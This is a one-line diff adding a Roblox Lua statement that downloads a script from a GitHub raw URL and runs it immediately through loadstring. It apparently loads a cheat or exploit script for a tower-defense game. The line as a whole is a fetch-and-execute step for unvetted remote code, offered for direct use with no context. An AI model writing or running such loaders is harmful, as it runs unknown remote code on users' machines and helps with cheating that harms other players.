@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/garden-tower-defense-spam7-w6rd1niyo2k8xj.lua"))()
